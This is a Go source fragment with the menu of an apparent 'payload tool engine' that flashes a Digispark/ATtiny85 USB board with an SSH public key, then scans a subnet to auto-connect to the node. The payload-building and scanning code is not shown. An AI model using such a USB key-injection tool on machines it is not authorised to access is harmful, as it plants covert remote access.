// -----------------------------------------------------------------------------
func ShowPayloadEngineMenu(reader *bufio.Reader, onConnect func(ip, port, user string)) {
	for {
		fmt.Println(Bold + Cyan + "\n==================================================================" + Reset)
		fmt.Println(Bold + Cyan + "          ⚡ PAYLOAD TOOL ENGINE (DIGISPARK / ATTINY85)         " + Reset)
		fmt.Println(Bold + Cyan + "==================================================================" + Reset)
		fmt.Println("  [1] Auto-Detect Host Public Key & Build Universal Digispark Hardware Token")
		fmt.Println("  [2] Enter Custom Public Key & Flash Digispark USB")
		fmt.Println("  [3] Install System Dependencies (Cross-Platform: apt/yum/pacman/brew)")
		fmt.Println(Green + Bold + "  [4] 🎯 Scan Subnet for Digispark Node & Auto-Connect (1-Click)" + Reset)
		fmt.Println("  [5] 🧹 Purge Temporary Toolchain (Reclaim Space)")
		fmt.Println(Red + "  [0] Back to Session Hub" + Reset)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)

		choice := transfer.ReadRealtimeInput("Select choice [0-5]: ")

		switch choice {
		case "1":
			pubKey := getLocalPublicKey()
			if pubKey == "" {
				fmt.Println(Red + "[!] No local SSH key found. Generating new Ed25519 keypair..." + Reset)
				pubKey = generateLocalSSHKey()
			}
			if pubKey != "" {
				buildAndFlashPayload(reader, pubKey)
			}
		case "2":
			fmt.Println(Yellow + "\nPaste target SSH Public Key below:" + Reset)
			customKey := transfer.ReadRealtimeInput("SSH Public Key: ")
			if strings.TrimSpace(customKey) != "" {
				buildAndFlashPayload(reader, strings.TrimSpace(customKey))
			} else {
				fmt.Println(Red + "[!] Key input was empty." + Reset)
			}
		case "3":
			installSystemDependencies()
		case "4":
			DiscoverAndConnectDigisparkNode(reader, onConnect)
		case "5":
			purgeTempToolchain()
			fmt.Println(Green + Bold + "[✔] Temporary toolchain wiped!" + Reset)
			pausePrompt()
		case "0", "q", "Q":
			return
		}
	}
}

// -----------------------------------------------------------------------------
// UTILITY HELPERS
// -----------------------------------------------------------------------------
func purgeTempToolchain() {
	fmt.Println(Yellow + "[+] Purging temp toolchain directory..." + Reset)
	_ = os.RemoveAll(getTempEngineDir())
}

func pausePrompt() {
	fmt.Print(Yellow + "\nPress Enter to continue..." + Reset)
	_ = transfer.ReadRealtimeInput("")
}